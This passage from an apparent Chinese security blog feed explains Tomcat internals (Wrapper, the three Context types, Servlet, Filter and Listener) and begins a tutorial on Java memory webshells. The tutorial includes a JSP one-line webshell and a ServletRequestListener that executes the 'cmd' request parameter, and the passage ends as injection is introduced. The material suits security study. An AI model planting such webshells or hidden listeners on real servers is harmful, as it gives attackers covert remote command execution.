href="#Wrapper（封装器）" class="headerlink" title="Wrapper（封装器）"></a>Wrapper（封装器）</h4><p><strong>Wrapper</strong> 是 <strong>Container</strong> 中的一个组件，一个<strong>Container</strong> 可以对应多个wrapper。它负责封装一个 <strong>Servlet</strong>。每个 <strong>Wrapper</strong> 对应一个 Servlet，它管理该 Servlet 的生命周期（初始化、请求处理、销毁）。<strong>Wrapper</strong> 是 <strong>Context</strong> 中的一个重要组成部分，它决定了 <strong>Servlet</strong> 如何在 Tomcat 中被加载和执行。</p><p>可以用一张图来表示请求在Container中的解析过程</p><p><img src="/./../img/ma/image-20250218181420354.png" alt="image-20250218181420354"></p><p>当访问 <code>https://manage.xxx.com:8080/user/list</code> 时，Tomcat 会按照以下流程处理请求：</p><ol><li><strong>请求接收：</strong> 客户端通过 HTTPS 协议向 Tomcat 的 8080 端口发送请求。</li><li><strong>Connector 处理：</strong> Tomcat 的 <code>Connector</code> 组件接收请求，并将其转换为内部的 <code>Request</code> 对象。</li><li><strong>Engine 路由：</strong> <code>Engine</code> 组件根据请求的主机名（<code>manage.xxx.com</code>）确定目标 <code>Host</code>。</li><li><strong>Host 路由：</strong> <code>Host</code> 组件根据请求的路径（<code>/user/list</code>）确定目标 <code>Context</code>。</li><li><strong>Context 路由：</strong> <code>Context</code> 组件根据请求的路径确定目标 <code>Wrapper</code>。</li><li><strong>Wrapper 调用 Servlet：</strong> <code>Wrapper</code> 调用其封装的 <code>Servlet</code> 的 <code>service()</code> 方法，处理请求并生成响应。</li><li><strong>响应返回：</strong> 生成的响应通过上述层次返回给客户端。</li></ol>]]></content>
      
      
      <categories>
          
          <category> -代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 标签2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>三种Context的联系与区别</title>
      <link href="/2025/02/23/%E4%B8%89%E7%A7%8DContext%E7%9A%84%E8%81%94%E7%B3%BB%E4%B8%8E%E5%8C%BA%E5%88%AB/"/>
      <url>/2025/02/23/%E4%B8%89%E7%A7%8DContext%E7%9A%84%E8%81%94%E7%B3%BB%E4%B8%8E%E5%8C%BA%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<h1 id="三种Context的联系与区别"><a href="#三种Context的联系与区别" class="headerlink" title="三种Context的联系与区别"></a>三种Context的联系与区别</h1><p>我们在分析和编写内存马的时候，总会涉及到ServletContext、ApplicationContext和StandardContext，下面我详细解释一下三者之间的联系和区别。</p><p>我们可以使用request.getServletContext()用于获取与当前 Servlet 相关联的 <code>ServletContext</code> 对象。</p><p><img src="/./../img/ma/image-20250220152416046.png" alt="image-20250220152416046"></p><h2 id="ServletContext"><a href="#ServletContext" class="headerlink" title="ServletContext"></a><strong>ServletContext</strong></h2><p>Servlet规范中定义的接口，代表Web应用的上下文环境。每个Web应用有且仅有一个ServletContext实例，用于全局资源共享。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">package javax.servlet;</span><br><span class="line"></span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.net.MalformedURLException;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.util.Enumeration;</span><br><span class="line">import java.util.EventListener;</span><br><span class="line">import java.util.Map;</span><br><span class="line">import java.util.Set;</span><br><span class="line">import javax.servlet.descriptor.JspConfigDescriptor;</span><br><span class="line"></span><br><span class="line">public interface ServletContext &#123;</span><br><span class="line"></span><br><span class="line">    public static final String TEMPDIR = &quot;javax.servlet.context.tempdir&quot;;</span><br><span class="line">    public static final String ORDERED_LIBS = &quot;javax.servlet.context.orderedLibs&quot;;</span><br><span class="line"></span><br><span class="line">    public String getContextPath();</span><br><span class="line">    public ServletContext getContext(String uripath);</span><br><span class="line">    public int getMajorVersion();</span><br><span class="line">    public int getMinorVersion();</span><br><span class="line">    public int getEffectiveMajorVersion();</span><br><span class="line">    public int getEffectiveMinorVersion();</span><br><span class="line">    public String getMimeType(String file);</span><br><span class="line">    public Set&lt;String&gt; getResourcePaths(String path);</span><br><span class="line">    public URL getResource(String path) throws MalformedURLException;</span><br><span class="line">    public InputStream getResourceAsStream(String path);</span><br><span class="line">    public RequestDispatcher getRequestDispatcher(String path);</span><br><span class="line">    public RequestDispatcher getNamedDispatcher(String name);</span><br><span class="line">    @Deprecated</span><br><span class="line">    public Servlet getServlet(String name) throws ServletException;</span><br><span class="line">    @Deprecated</span><br><span class="line">    public Enumeration&lt;Servlet&gt; getServlets();</span><br><span class="line">    @Deprecated</span><br><span class="line">    public Enumeration&lt;String&gt; getServletNames();</span><br><span class="line">    public void log(String msg);</span><br><span class="line">    @Deprecated</span><br><span class="line">    public void log(Exception exception, String msg);</span><br><span class="line">    public void log(String message, Throwable throwable);</span><br><span class="line">    public String getRealPath(String path);</span><br><span class="line">    public String getServerInfo();</span><br><span class="line">    public String getInitParameter(String name);</span><br><span class="line">    public Enumeration&lt;String&gt; getInitParameterNames();</span><br><span class="line">    public boolean setInitParameter(String name, String value);</span><br><span class="line">    public Object getAttribute(String name);</span><br><span class="line">    public Enumeration&lt;String&gt; getAttributeNames();</span><br><span class="line">    public void setAttribute(String name, Object object);</span><br><span class="line">    public void removeAttribute(String name);</span><br><span class="line">    public String getServletContextName();</span><br><span class="line">    public ServletRegistration.Dynamic addServlet(String servletName, String className);</span><br><span class="line">    public ServletRegistration.Dynamic addServlet(String servletName, Servlet servlet);</span><br><span class="line">    public ServletRegistration.Dynamic addServlet(String servletName, Class&lt;? extends Servlet&gt; servletClass);</span><br><span class="line">    public ServletRegistration.Dynamic addJspFile(String servletName, String jspFile);</span><br><span class="line">    public &lt;T extends Servlet&gt; T createServlet(Class&lt;T&gt; clazz) throws ServletException;</span><br><span class="line">    public ServletRegistration getServletRegistration(String servletName);</span><br><span class="line">    public Map&lt;String, ? extends ServletRegistration&gt; getServletRegistrations();</span><br><span class="line">    public FilterRegistration.Dynamic addFilter(String filterName, String className);</span><br><span class="line">    public FilterRegistration.Dynamic addFilter(String filterName, Filter filter);</span><br><span class="line">    public FilterRegistration.Dynamic addFilter(String filterName, Class&lt;? extends Filter&gt; filterClass);</span><br><span class="line">    public &lt;T extends Filter&gt; T createFilter(Class&lt;T&gt; clazz) throws ServletException;</span><br><span class="line">    public FilterRegistration getFilterRegistration(String filterName);</span><br><span class="line">    public Map&lt;String, ? extends FilterRegistration&gt; getFilterRegistrations();</span><br><span class="line">    public SessionCookieConfig getSessionCookieConfig();</span><br><span class="line">    public void setSessionTrackingModes(Set&lt;SessionTrackingMode&gt; sessionTrackingModes);</span><br><span class="line">    public Set&lt;SessionTrackingMode&gt; getDefaultSessionTrackingModes();</span><br><span class="line">    public Set&lt;SessionTrackingMode&gt; getEffectiveSessionTrackingModes();</span><br><span class="line">    public void addListener(String className);</span><br><span class="line">    public &lt;T extends EventListener&gt; void addListener(T t);</span><br><span class="line">    public void addListener(Class&lt;? extends EventListener&gt; listenerClass);</span><br><span class="line">    public &lt;T extends EventListener&gt; T createListener(Class&lt;T&gt; clazz) throws ServletException;</span><br><span class="line">    public JspConfigDescriptor getJspConfigDescriptor();</span><br><span class="line">    public ClassLoader getClassLoader();</span><br><span class="line">    public void declareRoles(String... roleNames);</span><br><span class="line">    public String getVirtualServerName();</span><br><span class="line">    public int getSessionTimeout();</span><br><span class="line">    public void setSessionTimeout(int sessionTimeout);</span><br><span class="line">    public String getRequestCharacterEncoding();</span><br><span class="line">    public void setRequestCharacterEncoding(String encoding);</span><br><span class="line">    public String getResponseCharacterEncoding();</span><br><span class="line">    public void setResponseCharacterEncoding(String encoding);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到ServletContext接口里面提供了很多addFilter addServlet等方法对Web应用的各种资源和功能进行访问。</p><h2 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a><strong>ApplicationContext</strong></h2><p>ApplicationContext是Tomcat对<code>ServletContext</code>接口的具体实现类，其实现了ServletContext接口中定义的一些方法。</p><p>我们注意到request.getServletContext()实际上得到的是ApplicationContextFacade()，这是因为tomcat对<code>ApplicationContext</code>类进行了封装。</p><h2 id="StandardContext"><a href="#StandardContext" class="headerlink" title="StandardContext"></a>StandardContext</h2><p>StandardContext持有ApplicationContext实例，并通过后者提供ServletContext功能,也就是在ApplicationContext类中，对资源的各种操作实际上是调用了StandardContext中的方法。</p><p>我们通过研究 ApplicationContext的源码发现，ApplicationContext中的方法都是通过context调用</p><p><img src="/./../img/ma/image-20250220154408638.png" alt="image-20250220154408638"></p><p><img src="/./../img/ma/image-20250220154447064.png" alt="image-20250220154447064"></p><p>而context就是一个实例化的StandardContext对象。</p><p><img src="/./../img/ma/image-20250220154653601.png" alt="image-20250220154653601"></p><p><img src="/./../img/ma/image-20250220154727228.png" alt="image-20250220154727228"></p><p><img src="/./../img/ma/image-20250220154747024.png" alt="image-20250220154747024"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我们用一张图来总结各context之间的关系</p><p><img src="/./../img/ma/image-20250220170507953.png" alt="image-20250220170507953"></p><p>StandardContext调用ApplicationContext来提供 ServletContext 相关功能，而ApplicationContextFacade封装ApplicationContext。</p>]]></content>
      
      
      <categories>
          
          <category> -代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 标签1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaWeb三大组件</title>
      <link href="/2025/02/23/JavaWeb%E7%BB%84%E4%BB%B6%E5%AD%A6%E4%B9%A0/"/>
      <url>/2025/02/23/JavaWeb%E7%BB%84%E4%BB%B6%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h1><p><strong>Servlet</strong> 是 Java Web 应用中的一个核心组件，负责处理客户端的请求，并生成响应。Servlet 是一个在服务器上运行的 Java 类，可以通过配置文件或注解与 URL 映射。Servlet 是 Java Web 应用的请求处理中心，处理逻辑通常在这里实现。</p><p><strong>加载和实例化</strong>：</p><ul><li>Servlet 被容器加载并实例化，通常是由配置文件（如 <code>web.xml</code>）或注解控制。</li></ul><p><strong>初始化</strong>：</p><ul><li>调用 <code>init()</code> 方法，Servlet 执行初始化操作。此方法在 Servlet 实例化时调用一次。</li></ul><p><strong>请求处理</strong>：</p><ul><li>每次客户端发起请求时，容器都会调用 <code>service()</code> 方法，<code>service()</code> 方法根据请求类型分发给相应的 <code>doGet()</code>、<code>doPost()</code> 等方法来处理请求。</li></ul><p><strong>销毁</strong>：</p><ul><li>当 Servlet 不再需要时，容器调用 <code>destroy()</code> 方法进行清理。通常在容器关闭或者 Servlet 被卸载时调用。</li></ul><p>[ Servlet 被加载 ] –&gt; [ 调用 init() 方法 ] –&gt; [ 调用 service() 方法 ] –&gt; [ 调用 destroy() 方法 ]</p><h4 id="Servlet使用示例"><a href="#Servlet使用示例" class="headerlink" title="Servlet使用示例"></a>Servlet使用示例</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import javax.servlet.*;</span><br><span class="line">import javax.servlet.http.*;</span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">@WebServlet(&quot;/hello&quot;)  // 注解定义Servlet的URL映射</span><br><span class="line">public class HelloServlet extends HttpServlet &#123;</span><br><span class="line">    @Override</span><br><span class="line">    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;</span><br><span class="line">        // 设置响应内容类型</span><br><span class="line">        response.setContentType(&quot;text/html&quot;);</span><br><span class="line">        </span><br><span class="line">        // 获取输出流</span><br><span class="line">        PrintWriter out = response.getWriter();</span><br><span class="line">        </span><br><span class="line">        // 输出 HTML 内容</span><br><span class="line">        out.println(&quot;&lt;html&gt;&lt;body&gt;&quot;);</span><br><span class="line">        out.println(&quot;&lt;h1&gt;Hello, Java Web Servlet!&lt;/h1&gt;&quot;);</span><br><span class="line">        out.println(&quot;&lt;/body&gt;&lt;/html&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里我们使用注解来注册Servlet</p><p>当然也可以使用web.xml文件来注册Servlet</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;web-app xmlns=&quot;http://java.sun.com/xml/ns/javaee&quot;</span><br><span class="line">         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation=&quot;http://java.sun.com/xml/ns/javaee</span><br><span class="line">             http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd&quot;</span><br><span class="line">         version=&quot;3.0&quot;&gt;</span><br><span class="line">    &lt;servlet&gt;</span><br><span class="line">        &lt;servlet-name&gt;HelloServlet&lt;/servlet-name&gt;</span><br><span class="line">        &lt;servlet-class&gt;com.example.HelloServlet&lt;/servlet-class&gt;</span><br><span class="line">    &lt;/servlet&gt;</span><br><span class="line">    &lt;servlet-mapping&gt;</span><br><span class="line">        &lt;servlet-name&gt;HelloServlet&lt;/servlet-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;/hello&lt;/url-pattern&gt;</span><br><span class="line">    &lt;/servlet-mapping&gt;</span><br><span class="line">&lt;/web-app&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Filter（过滤器）"><a href="#Filter（过滤器）" class="headerlink" title="Filter（过滤器）"></a><strong>Filter（过滤器）</strong></h1><p><strong>Filter</strong> 用于在请求到达 Servlet 之前或响应返回客户端之前对请求和响应进行处理。<strong>Filter</strong> 可以用于日志记录、安全检查、请求数据修改、响应数据修改等功能。</p><p><img src="/./../img/ma/image-20250218182757170.png" alt="image-20250218182757170"></p><p>下面是一个简单的Filter Servlet示例，这里我们同样使用注解方式进行配置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import javax.servlet.*;</span><br><span class="line">import javax.servlet.http.*;</span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">public class MyFilter implements Filter &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void init(FilterConfig filterConfig) throws ServletException &#123;</span><br><span class="line">        // 初始化代码</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)</span><br><span class="line">            throws IOException, ServletException &#123;</span><br><span class="line">        // 请求处理前</span><br><span class="line">        System.out.println(&quot;开始过滤前&quot;);</span><br><span class="line"></span><br><span class="line">        // 传递给下一个过滤器或 Servlet</span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line"></span><br><span class="line">        // 响应处理后</span><br><span class="line">        System.out.println(&quot;过滤完毕&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void destroy() &#123;</span><br><span class="line">        // 清理资源</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;filter&gt;</span><br><span class="line">    &lt;filter-name&gt;MyFilter&lt;/filter-name&gt;</span><br><span class="line">    &lt;filter-class&gt;com.example.MyFilter&lt;/filter-class&gt;</span><br><span class="line">&lt;/filter&gt;</span><br><span class="line"></span><br><span class="line">&lt;filter-mapping&gt;</span><br><span class="line">    &lt;filter-name&gt;MyFilter&lt;/filter-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/hello&lt;/url-pattern&gt;  &lt;!-- 过滤路径 --&gt;</span><br><span class="line">&lt;/filter-mapping&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="FilterChain"><a href="#FilterChain" class="headerlink" title="FilterChain"></a>FilterChain</h2><p>一个servlet可以注册多个Filter，这样请求和响应经过多个Filter，形成FilterChain。并按照一定的顺序依次执行各Filter的doFilter()方法，这些Filterchail完全可以放在一个列表里执行。</p><p><img src="/./../img/ma/image-20250218190712719.png" alt="image-20250218190712719"></p><h1 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h1><p>Listener（监听器）是用于监听和响应特定事件的组件。它们可以感知并响应与应用程序相关的事件，从而执行相应的逻辑处理。例如，监听应用程序启动和关闭、会话创建和销毁、请求和响应的属性更改等事件。</p><p>按照监听的对象不同可以划分为三类</p><ul><li><p>ServletContextListener</p></li><li><p>HttpSessionListener</p></li><li><p>ServletRequestListener</p></li></ul><h1 id="三者的加载顺序"><a href="#三者的加载顺序" class="headerlink" title="三者的加载顺序"></a>三者的加载顺序</h1><p>无需多言，直接上图</p><p><img src="/./../img/ma/179803793a7e638f8c4b23ba3b6455f.png" alt="179803793a7e638f8c4b23ba3b6455f"></p>]]></content>
      
      
      <categories>
          
          <category> -代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 标签2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java内存马(web传统型)详解</title>
      <link href="/2025/02/23/Java%E5%86%85%E5%AD%98%E9%A9%AC%E8%AF%A6%E8%A7%A3/"/>
      <url>/2025/02/23/Java%E5%86%85%E5%AD%98%E9%A9%AC%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>作为后来的学习者和探索者，我深知自己站在巨人的肩膀上。每一项技术的进步背后，都有无数前人的辛勤付出与深思熟虑。正是他们的努力，才为我提供了这片沃土，让我能够在这个基础上继续思考和前行。虽然这篇文章只能算作我在这个领域的一次小小尝试，但我更希望它能成为对前辈们探索精神的一种致敬，并为后续的师傅提供一些参考和启发。</p><p>环境：tomcat 9.0.68  java8  idea</p><p>在读这篇文章之前，建议了解下学习下前置知识</p><h2 id="JSP木马"><a href="#JSP木马" class="headerlink" title="JSP木马"></a>JSP木马</h2><p>在普通的webshell攻击中，恶意代码通常存储在硬盘或外部设备上，以文件的形式存在（php、jsp），例如，以下是一个简单一句话木马。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">  Process process = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));</span><br><span class="line">  System.out.println(process);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>在实战中，我们需要通过文件上传漏洞将webshell传到服务器。</p><p>传统的安全防护主要集中在文件系统层面，例如杀毒软件、文件监控、反病毒检测等，它们通过扫描硬盘上的恶意文件来发现和拦威胁，且传统的安全防护技术手段越来越成熟，导致现在的webshell容易被查杀</p><p>而Java内存马则不同，它将恶意代码直接加载到内存中运行。因为代码是直接在内存中执行的，它不需要保存到硬盘上，这使得它很难被传统的杀毒软件发现和检测。</p><h2 id="传统web应用内存马（Tomcat内存马）"><a href="#传统web应用内存马（Tomcat内存马）" class="headerlink" title="传统web应用内存马（Tomcat内存马）"></a>传统web应用内存马（Tomcat内存马）</h2><p>tomcat内存马主要有三个类型，Listener型、Filter型、Servlet，正好对应java web应用的三大组件，因此Tomcat内存马的实现原理是利用Java动态类加载和反射机制，动态注册恶意的Listener、Filter、Servlet或Valve等组件到Tomcat容器中，从而在内存中持久化恶意代码，实现隐蔽的攻击触发。</p><h3 id="Listener型"><a href="#Listener型" class="headerlink" title="Listener型"></a>Listener型</h3><p><code>Listener</code>是最先被加载的，根据前面内存马的实现思路，只要动态注册一个恶意的<code>Listener</code>，就又可以形成一种内存马了。在tomcat中Listener分为<code>ServletContextListener</code>、<code>HttpSessionListener</code>或<code>ServletRequestListener</code>，很明显<code>ServletRequestListener</code>是最适合做内存马的，因为访问任何服务就能触发操作。</p><h4 id="编写一个简单的ServletRequestListener"><a href="#编写一个简单的ServletRequestListener" class="headerlink" title="编写一个简单的ServletRequestListener"></a>编写一个简单的ServletRequestListener</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">package com.example.listenshell;</span><br><span class="line"></span><br><span class="line">import javax.servlet.ServletRequestEvent;</span><br><span class="line">import javax.servlet.ServletRequestListener;</span><br><span class="line">import javax.servlet.annotation.WebListener;</span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">@WebListener</span><br><span class="line">public class Shell_Listener implements ServletRequestListener &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void requestInitialized(ServletRequestEvent sre) &#123;</span><br><span class="line">        HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">        String cmd = request.getParameter(&quot;cmd&quot;); // 从请求参数中获取命令</span><br><span class="line">        if (cmd != null) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                Runtime.getRuntime().exec(cmd); // 执行命令</span><br><span class="line">            &#125; catch (IOException e) &#123;</span><br><span class="line">                e.printStackTrace(); // 打印异常信息</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void requestDestroyed(ServletRequestEvent sre) &#123;</span><br><span class="line">        // 这里可以添加请求销毁时的逻辑（如果需要）</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="/./../img/ma/image-20250222002830136.png" alt="image-20250222002830136"></p><h4 id="从代码层面分析Listener的创建流程"><a href="#从代码层面分析Listener的创建流程" class="headerlink" title="从代码层面分析Listener的创建流程"></a>从代码层面分析Listener的创建流程</h4><p>先来看一下调用栈</p><p><img src="/./../img/ma/image-20250220132736261.png" alt="image-20250220132736261"></p><p>查看StandardContext类的fireRequestInitEvent方法，可见fireRequestInitEvent()调用了我们Listener的requestInitialized()方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">public boolean fireRequestInitEvent(ServletRequest request) &#123;</span><br><span class="line"></span><br><span class="line">    Object instances[] = getApplicationEventListeners();</span><br><span class="line"></span><br><span class="line">    if ((instances != null) &amp;&amp; (instances.length &gt; 0)) &#123;</span><br><span class="line"></span><br><span class="line">        ServletRequestEvent event =</span><br><span class="line">                new ServletRequestEvent(getServletContext(), request);</span><br><span class="line"></span><br><span class="line">        for (int i = 0; i &lt; instances.length; i++) &#123;</span><br><span class="line">            if (instances[i] == null)</span><br><span class="line">                continue;</span><br><span class="line">            if (!(instances[i] instanceof ServletRequestListener))</span><br><span class="line">                continue;</span><br><span class="line">            ServletRequestListener listener =</span><br><span class="line">                (ServletRequestListener) instances[i];</span><br><span class="line"></span><br><span class="line">            try &#123;</span><br><span class="line">                listener.requestInitialized(event);</span><br><span class="line">            &#125; catch (Throwable t) &#123;</span><br><span class="line">                ExceptionUtils.handleThrowable(t);</span><br><span class="line">                getLogger().error(sm.getString(</span><br><span class="line">                        &quot;standardContext.requestListener.requestInit&quot;,</span><br><span class="line">                        instances[i].getClass().getName()), t);</span><br><span class="line">                request.setAttribute(RequestDispatcher.ERROR_EXCEPTION, t);</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/./../img/ma/image-20250220175958120.png" alt="image-20250220175958120"></p><p>我们往前跟，看下listener是从哪里来的。直接右键查看声明或用例，在前两行找到了listener的实现，来自于instances[i]，在旁边也显示出listener就是我们创建的Shell_Listener，那就说明至少在这一步或者前一步我们的listener已经被创建了。</p><p><img src="/./../img/ma/image-20250220132821258.png" alt="image-20250220132821258"></p><p>我们继续往前跟，查看instances[i]是怎么产生的。最终定位到这里，显示listener已经存在。</p><p><img src="/./../img/ma/image-20250220132913599.png" alt="image-20250220132913599"></p><p>继续跟进getApplicationEventListeners()</p><p><img src="/./../img/ma/image-20250220180944925.png" alt="image-20250220180944925"></p><p>经过询问AI，这段代码的作用是将存储在<code>applicationEventListenersList</code>集合中的所有事件监听器对象转换为数组，并返回给调用者。那么，意思就是Listener实际上是存储在*<code>applicationEventListenersList</code>*属性中。</p><p>所以我们的下一步就要找到Litener是如何被添加到applicationEventListenersList中的，这里我们直接查找用法，不出意外找到了五处*<code>applicationEventListenersList</code>*被应用的地方。</p><p><img src="/./../img/ma/image-20250220181446039.png" alt="image-20250220181446039"></p><p>根据字面意思，addApplicationEventListener（）是最有可能监听器被添加的地方。不出所料。</p><p><img src="/./../img/ma/image-20250220181636714.png" alt="image-20250220181636714"></p><h4 id="编写Listener内存马"><a href="#编写Listener内存马" class="headerlink" 